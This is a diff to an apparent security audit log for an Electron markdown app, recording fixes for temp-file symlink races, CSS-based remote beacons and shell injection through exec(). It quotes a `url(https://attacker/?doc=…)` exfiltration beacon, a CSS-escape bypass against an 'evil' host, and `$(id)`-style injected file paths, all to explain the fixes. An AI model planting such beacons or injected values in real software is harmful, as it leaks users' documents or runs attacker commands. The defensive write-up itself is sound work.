@@ -54,6 +54,11 @@ document. Everything marked FIXED below is covered by a regression test — in
 | SEC-16/17/18 | **FIXED** earlier | Dependency upgrades (24 advisories → 0). |
 | SEC-19 | **FIXED** | Release workflow: every action pinned to a commit SHA (+ Dependabot to keep the pins moving), `softprops/action-gh-release` moved off the unmaintained v1, `npm ci` instead of `npm install`, `contents: write` narrowed to the publish job only, `persist-credentials: false` on checkout. Also fixed a defect the audit missed: the workflow pinned Node 18 against `engines.node >= 22.12.0` + `engine-strict=true`, so it could not have built at all. Code signing remains open. |
 | SEC-27 | **FIXED** | OmniWare's hand-drawn fonts were `@import`ed from fonts.googleapis.com and silently refused by the popup CSP, so every wireframe rendered in generic `cursive`. Fonts vendored locally and emitted as `@font-face` by `omniwareFontFaceCss()`. Found by the error sentinel, not by the audit. |
+| SEC-20 | **FIXED** | Popup documents were written to a fixed, world-guessable path under the shared temp directory. Now each goes into its own `mkdtempSync` directory (0700) and is created with `flag: "wx"`, so a pre-planted symlink causes an error instead of a redirected write. The same treatment for the portable-update batch script, whose `exec()` with an interpolated path also became `spawn()` with an argv array. Fixing this also fixed a plain functional bug: two popups of the same kind shared one filename, so the second overwrote the first and whichever closed first deleted the other's document. |
+| SEC-21 | **FIXED** (both halves) | `<iframe src>` is stripped in the sanitizer hook (see SEC-11). `style` stays in the allowlist — notes, themes and upstream markdown all need it — so the URLs *inside* CSS are filtered instead: `url()`, `image-set()` and `@import` may name only a relative path, a local drive path or an inert `data:image/…` (SVG excluded). Values are CSS-unescaped before being judged, and remote ones are rewritten to `about:blank`. This matters because `img-src https:` is deliberately open, so the CSP does **not** stop a `background-image` beacon. |
+| SEC-22 | **FIXED** | `exec()` with an interpolated path on the WSL export route became `execFile()` with an argument vector, so no shell ever re-parses the filename. **Caveat: not executed end-to-end** — the branch is `process.platform === "linux"` only and this machine is Windows. Syntax- and review-checked, not run. |
+| SEC-24 | **WON'T FIX** (by design) | Session restore re-opens the previously-open documents on launch. That is the feature the fork exists for, and every injection route it could re-arm (SEC-01..07, SEC-12/13/14, SEC-21, SEC-26) is now closed at the source. Recorded so the trade is explicit rather than overlooked. |
+| SEC-25 | **FIXED** | The no-op `sanitize: false` option is deleted from `marked.setOptions`, with a comment naming DOMPurify as the sole sanitization boundary. Info-severity documentation defect; nothing behavioural changed, so it carries no test. |
 
 ### Why the popup CSP is the primary control, not defence in depth
 
@@ -1152,6 +1157,44 @@ Also note the temp files are only removed on the `closed` event — an app crash
 
 **Fix.** Use `fs.mkdtempSync(path.join(os.tmpdir(), 'omnicore-'))` for a unique 0700 directory per invocation, and open with `flag: 'wx'` to fail on a pre-existing path.
 
+### FIXED
+
+Two helpers in `main.js`, `writePopupDocument(kind, html)` and `removePopupDocument(tmp)`,
+replace the five hand-rolled paths. Each popup document goes into its own
+`mkdtempSync(path.join(os.tmpdir(), "omnicore-"))` directory — unpredictable name, mode
+0700 — and is written with `{ flag: "wx", mode: 0o600 }`. The two controls are
+complementary and both are needed:
+
+- `mkdtemp` removes the *guessability*: an attacker cannot pre-plant a symlink at a path
+  they cannot predict.
+- `wx` removes the *consequence* if they somehow do: `open(O_EXCL)` refuses an existing
+  path, symlink included, so the write errors rather than being redirected.
+
+`removePopupDocument` unlinks the file and then removes the directory, so a crash leaves at
+most one empty directory rather than attacker-derived HTML.
+
+The portable-update batch script got the same treatment, plus two further changes:
+`exec()` with the path interpolated into a shell string became `spawn("cmd.exe", ["/c",
+batchPath])` with an argv array, and the batch now deletes itself on completion instead of
+being left behind. **Caveat:** this path only runs for a portable Windows install and could
+not be executed end-to-end; it is syntax-checked and reviewed only.
+
+**A functional bug fell out of the same change.** All popups of a given kind shared one
+filename. Opening two mermaid popups meant the second overwrote the first's document, and
+whichever closed first deleted the file out from under the other. That was a plain
+user-visible bug sitting inside the security finding, and it now has its own assertion.
+
+**Proof (R40, R41).** Restoring the fixed path fails four of the five SEC-20 assertions —
+the fifth is a control asserting that `wx` really does refuse an existing path, which is a
+property of `fs`, not of this code, so it correctly stays green.
+
+R41 was needed because the first version of the "not at the old path" assertion compared
+`path.dirname()` (forward slashes, from a `file://` URL) against `os.tmpdir()`
+(backslashes, on Windows). Those two strings are *never* equal, so that clause asserted
+nothing. It now compares via `path.resolve()` case-insensitively, and R41 — a revert that
+keeps a unique filename but puts it back in the shared temp root — confirms the repaired
+clause actually fails.
+
 ---
 
 ## SEC-21 — `<iframe src>` and inline `style` are explicitly re-enabled in the sanitizer
@@ -1179,6 +1222,46 @@ survives sanitization and loads remote attacker content inside the application, 
 
 **Fix.** Drop `iframe` from `ADD_TAGS` (it exists only to support the `@@@html` feature, which should be removed per SEC-01). If `style` must stay, constrain it via DOMPurify hooks or a CSS allowlist.
 
+### FIXED — both halves, and the second half was the harder one
+
+**`<iframe src>`** is removed in the `afterSanitizeAttributes` hook (done under SEC-11).
+The tag itself stays, because `@@@html` is built from `srcdoc`; only the attribute goes.
+
+**`style` was kept deliberately.** Dropping it from the allowlist is not available: the
+notes feature colours entries with inline styles, the theme system writes them, and
+upstream markdown uses them. So rather than remove the attribute, the fix removes what
+made it dangerous — the ability to name a remote resource:
+
+- `url()`, `image-set()` / `-webkit-image-set()` and `@import` are all filtered.
+  `image-set()` and `@import` matter because **neither needs a `url()` wrapper**; filtering
+  only `url()` would have left two open doors.
+- A value is kept only if it is a relative path, a local drive path (reusing the SEC-12
+  `isLocalImagePath` check, so a UNC path smuggled in behind a local-looking prefix is
+  still refused), or an inert `data:image/…`. **SVG is excluded** from that data: allowlist:
+  a data: SVG is a document that can carry script, not just pixels.
+- Everything else is rewritten to `url("about:blank")` rather than deleted, so the
+  surrounding declaration survives and the rest of the element still styles correctly.
+  There is an explicit assertion for that, because a fix that quietly nuked the whole
+  attribute would be indistinguishable from removing `style` from the allowlist.
+- Values are **CSS-unescaped before being judged**. This is load-bearing: CSS permits
+  `\68 ttps:` for `https:`, and testing the raw text catches nothing.
+
+**Why the CSP does not already cover this.** `img-src https:` is deliberately open so that
+ordinary documents can display remote images. That is precisely the directive a
+`background-image: url(https://attacker/?doc=…)` beacon needs. No click, no script, fires
+on every render of the document.
+
+**A bug found by the test, in the fix itself.** The first version of the unquoted-`url()`
+tokenizer used `[^)\s]`, which stops at whitespace. But a CSS hex escape is *terminated* by
+a space — `url(\68 ttps://evil/)` is one token containing a space. The pattern therefore
+failed to match at all and the value passed through completely unfiltered. The escape
+assertion caught it; the tokenizer now treats a hex escape as a single unit.
+
+**Proof (R42).** Replacing `sanitizeCssText(raw)` with `raw` at both call sites fails
+exactly the five blocking assertions — style attribute, CSS escape, protocol-relative,
+`image-set()`, `<style>` element — while the three "legitimate CSS survives" controls stay
+green, which is the correct signature for a control that only removes things.
+
 ---
 
 ## SEC-22 — Command injection surface in `exec()` on the WSL export path
@@ -1198,6 +1281,17 @@ function openFileAfterExport(filePath) {
 **Why it is only Low.** `filePath` is interpolated into a shell command inside double quotes, where `$`, `` ` `` and `\` remain active — a path containing `` `id` `` or `$(id)` would execute. However `filePath` originates from `dialog.showSaveDialog()` (`main.js:635`, `690`, `1409`, `1544`), so the user must type the malicious path themselves. The `defaultPath` *is* derived from the document filename (`main.js:601-604`, `659-663`), which an attacker can influence, but the user must still accept the dialog, and native save dialogs generally reject shell metacharacters in the filename field. I could not construct a realistic end-to-end attack — reported as a code-quality-adjacent security defect rather than an exploitable bug.
 
 **Fix.** Use `execFile('wslpath', ['-w', filePath])`, which bypasses the shell entirely.
+
+### FIXED — with an honest caveat about verification
+
+Both calls now use `execFile` with an argument vector, and the `{ exec }` import was
+replaced with `{ execFile }` so the shell-invoking form is no longer even in scope in
+`main.js`.
+
+**This could not be executed end-to-end.** The branch is guarded by
+`process.platform === "linux"` and the development machine is Windows, so no test in the
+suite reaches it. It is syntax-checked and reviewed, not run — recorded here rather than
+counted as verified, the same way the portable-update batch rewrite under SEC-20 is.
 
 ---
 
@@ -1258,6 +1352,14 @@ marked.setOptions({
 `sanitize` was deprecated in marked v0.7 and **removed in v5**; the app runs marked 9.1.6, so this key is silently ignored. The good news: it is set to `false`, meaning the code is *not* relying on it — DOMPurify is the actual control. Flagged only because a reader (or a future maintainer) may believe a sanitizer setting is in force here when none is. Setting it to `true` would not help either — it would still be ignored.
 
 **Fix.** Delete the dead option and add a comment stating that DOMPurify is the sole sanitization boundary.
+
+### FIXED
+
+The key is deleted and replaced with a comment naming DOMPurify (`SANITIZE_CONFIG`) as the
+only sanitization boundary in the pipeline, and noting that setting `sanitize: true` here
+would not create one. Nothing behavioural changed, so this deliberately carries no
+regression test — an assertion that a removed option is still removed would only restate
+the diff.
 
 ---
 
